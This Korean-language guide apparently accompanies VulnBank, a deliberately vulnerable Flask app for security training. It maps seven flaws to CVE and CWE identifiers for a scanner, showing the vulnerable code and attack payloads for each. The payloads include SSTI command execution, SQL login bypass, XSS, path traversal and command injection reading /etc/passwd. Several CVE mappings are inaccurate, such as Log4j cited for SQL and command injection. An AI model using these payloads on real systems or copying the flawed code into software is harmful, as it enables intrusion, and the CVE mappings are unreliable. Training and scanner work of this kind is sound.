# 🔓 VulnBank CVE 매칭 취약점 가이드

이 문서는 VulnBank에 포함된 각 취약점과 매칭 가능한 CVE 정보를 제공합니다.

---

## 📋 CVE 매칭 가능 취약점 목록

### 1. 🔴 Server-Side Template Injection (SSTI)

**위치**: 
- `/template-preview?template=`
- `/custom-template`

**CVE 정보**:
- **CVE-2024-22195**: Jinja2 Server-Side Template Injection
- **CVE-2016-1000001**: Jinja2 템플릿 인젝션 취약점 패턴
- **CWE-94**: Code Injection

**취약한 코드**:
```python
# 취약점: 사용자 입력을 직접 템플릿으로 렌더링
template_content = request.args.get('template', '')
rendered = render_template_string(template_content)  # CVE-2024-22195 패턴
```

**공격 페이로드**:
```python
# CVE-2024-22195 공격 예시
/template-preview?template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# CVE-2016-1000001 공격 예시
/template-preview?template={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Server-Side Template Injection",
  "cve": ["CVE-2024-22195", "CVE-2016-1000001"],
  "cwe": "CWE-94",
  "severity": "Critical",
  "location": "/template-preview, /custom-template"
}
```

---

### 2. 🔴 SQL Injection

**위치**: 
- `/login`
- `/register`
- `/search`

**CVE 패턴**:
- **CVE-2021-44228**: Log4j 패턴 (SQL Injection 유사 패턴)
- **CVE-2019-9193**: PostgreSQL 패턴
- **CWE-89**: SQL Injection

**취약한 코드**:
```python
# CVE 패턴: 문자열 연결로 인한 SQL Injection
query = f"SELECT * FROM users WHERE username='{username}' AND password='{hash}'"
cursor.execute(query)
```

**공격 페이로드**:
```
Username: ' OR '1'='1'--
Password: anything
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "SQL Injection",
  "cve_pattern": ["CVE-2021-44228", "CVE-2019-9193"],
  "cwe": "CWE-89",
  "severity": "Critical",
  "location": "/login, /register, /search"
}
```

---

### 3. 🟠 Cross-Site Scripting (XSS)

**위치**: 
- `/search?q=` (Reflected XSS)
- `/notice/*` (Stored XSS)

**CVE 패턴**:
- **CVE-2020-3580**: Cisco 패턴
- **CVE-2019-16759**: vBulletin 패턴
- **CWE-79**: Cross-site Scripting

**취약한 코드**:
```python
# CVE 패턴: 사용자 입력 이스케이프 없이 템플릿에 전달
query = request.args.get('q', '')
return render_template('search.html', query=query)  # CVE-2020-3580 패턴
```

**공격 페이로드**:
```html
/search?q=<script>alert('XSS')</script>
/search?q=<img src=x onerror="alert('XSS')">
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Cross-Site Scripting",
  "cve_pattern": ["CVE-2020-3580", "CVE-2019-16759"],
  "cwe": "CWE-79",
  "severity": "High",
  "location": "/search, /notice/*"
}
```

---

### 4. 🟡 Path Traversal

**위치**: 
- `/download?file=`
- `/uploads/<filename>`

**CVE 정보**:
- **CVE-2023-23934**: Werkzeug의 경로 정규화 취약점
- **CVE-2021-41773**: Apache Path Traversal 패턴
- **CWE-22**: Path Traversal

**취약한 코드**:
```python
# CVE-2023-23934: Werkzeug의 경로 정규화 취약점 패턴
filename = request.args.get('file', '')
filepath = os.path.join('documents', filename)
return send_file(filepath)  # CVE-2023-23934 패턴
```

**공격 페이로드**:
```
/download?file=../../../etc/passwd
/download?file=..%2f..%2f..%2fetc%2fpasswd
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Path Traversal",
  "cve": ["CVE-2023-23934", "CVE-2021-41773"],
  "cwe": "CWE-22",
  "severity": "High",
  "location": "/download, /uploads/*"
}
```

---

### 5. 🟡 Command Injection

**위치**: 
- `/admin/server-status?host=`
- `/admin/dns-lookup?domain=`

**CVE 패턴**:
- **CVE-2021-44228**: Command Injection 패턴
- **CWE-78**: OS Command Injection

**취약한 코드**:
```python
# CVE 패턴: shell=True 사용, 입력 검증 없음
host = request.args.get('host', 'localhost')
result = subprocess.check_output(f'ping -c 1 {host}', shell=True)  # CVE-2021-44228 패턴
```

**공격 페이로드**:
```bash
/admin/server-status?host=localhost;cat /etc/passwd
/admin/server-status?host=localhost && id
/admin/server-status?host=localhost | whoami
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Command Injection",
  "cve_pattern": ["CVE-2021-44228"],
  "cwe": "CWE-78",
  "severity": "Critical",
  "location": "/admin/server-status, /admin/dns-lookup"
}
```

---

### 6. 🔐 Session Management 취약점

**위치**: 전체 애플리케이션

**CVE 정보**:
- **CVE-2018-1000656**: Flask의 세션 쿠키 취약점
- **CVE-2023-30861**: Flask에서의 정보 노출 취약점
- **CWE-613**: Insufficient Session Expiration
- **CWE-798**: Use of Hard-coded Credentials

**취약한 코드**:
```python
# CVE-2018-1000656: Flask의 세션 쿠키 취약점 패턴
app.secret_key = 'secret123'  # 약한 시크릿 키
resp.set_cookie('user_role', 'admin')  # 쿠키에 민감정보 저장
```

**공격 방법**:
```javascript
// 브라우저 콘솔에서 실행
document.cookie = "user_role=admin"
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Session Management",
  "cve": ["CVE-2018-1000656", "CVE-2023-30861"],
  "cwe": ["CWE-613", "CWE-798"],
  "severity": "High",
  "location": "전체 애플리케이션"
}
```

---

### 7. 📢 Information Disclosure

**위치**: 에러 핸들러, 디버그 모드

**CVE 정보**:
- **CVE-2023-25577**: Werkzeug의 디버그 모드 취약점
- **CVE-2023-30861**: Flask에서의 정보 노출 취약점
- **CWE-209**: Information Exposure Through an Error Message
- **CWE-215**: Information Exposure Through Debug Information

**취약한 코드**:
```python
# CVE-2023-25577: Werkzeug의 디버그 모드 취약점
app.config['DEBUG'] = True  # 디버그 모드 활성화
error = f'데이터베이스 오류: {str(e)}'  # 상세한 에러 메시지 노출
```

**스캐너 매칭 정보**:
```json
{
  "vulnerability_type": "Information Disclosure",
  "cve": ["CVE-2023-25577", "CVE-2023-30861"],
  "cwe": ["CWE-209", "CWE-215"],
  "severity": "Medium",
  "location": "에러 핸들러, 디버그 모드"
}
```

---

## 📊 CVE 매칭 요약표

| 취약점 유형 | CVE 번호 | CWE | 심각도 | 위치 |
|------------|----------|-----|--------|------|
| Server-Side Template Injection | CVE-2024-22195, CVE-2016-1000001 | CWE-94 | Critical | `/template-preview`, `/custom-template` |
| SQL Injection | CVE-2021-44228 (패턴), CVE-2019-9193 (패턴) | CWE-89 | Critical | `/login`, `/register`, `/search` |
| Cross-Site Scripting | CVE-2020-3580 (패턴), CVE-2019-16759 (패턴) | CWE-79 | High | `/search`, `/notice/*` |
| Path Traversal | CVE-2023-23934, CVE-2021-41773 (패턴) | CWE-22 | High | `/download`, `/uploads/*` |
| Command Injection | CVE-2021-44228 (패턴) | CWE-78 | Critical | `/admin/server-status`, `/admin/dns-lookup` |
| Session Management | CVE-2018-1000656, CVE-2023-30861 | CWE-613, CWE-798 | High | 전체 애플리케이션 |
| Information Disclosure | CVE-2023-25577, CVE-2023-30861 | CWE-209, CWE-215 | Medium | 에러 핸들러, 디버그 모드 |

---

## 🛠️ 스캐너 구현 가이드

### CVE 매칭 로직 예시

```python
def match_cve(vulnerability_type, location, context):
    """
    취약점을 CVE와 매칭하는 함수
    """
    cve_mapping = {
        "Server-Side Template Injection": {
            "cve": ["CVE-2024-22195", "CVE-2016-1000001"],
            "cwe": "CWE-94",
            "severity": "Critical"
        },
        "SQL Injection": {
            "cve_pattern": ["CVE-2021-44228", "CVE-2019-9193"],
            "cwe": "CWE-89",
            "severity": "Critical"
        },
        "Cross-Site Scripting": {
            "cve_pattern": ["CVE-2020-3580", "CVE-2019-16759"],
            "cwe": "CWE-79",
            "severity": "High"
        },
        "Path Traversal": {
            "cve": ["CVE-2023-23934", "CVE-2021-41773"],
            "cwe": "CWE-22",
            "severity": "High"
        },
        "Command Injection": {
            "cve_pattern": ["CVE-2021-44228"],
            "cwe": "CWE-78",
            "severity": "Critical"
        },
        "Session Management": {
            "cve": ["CVE-2018-1000656", "CVE-2023-30861"],
            "cwe": ["CWE-613", "CWE-798"],
            "severity": "High"
        },
        "Information Disclosure": {
            "cve": ["CVE-2023-25577", "CVE-2023-30861"],
            "cwe": ["CWE-209", "CWE-215"],
            "severity": "Medium"
        }
    }
    
    if vulnerability_type in cve_mapping:
        result = cve_mapping[vulnerability_type].copy()
        result["location"] = location
        result["context"] = context
        return result
    
    return None
```

---

## 📝 참고사항

1. **CVE 패턴**: 일부 취약점은 정확한 CVE 번호가 아닌 유사한 패턴의 CVE를 참조합니다.
2. **라이브러리 버전**: 실제 CVE 매칭을 위해서는 사용 중인 라이브러리 버전을 확인해야 합니다.
3. **최신 CVE**: CVE 데이터베이스는 지속적으로 업데이트되므로 최신 정보를 확인하세요.

---

**작성일**: 2024
**대상 버전**: VulnBank v1.0 (CVE 매칭 버전)
**Flask 버전**: 2.0.0 (취약한 버전)
**Jinja2 버전**: 2.11.0 (취약한 버전)
**Werkzeug 버전**: 2.0.0 (취약한 버전)






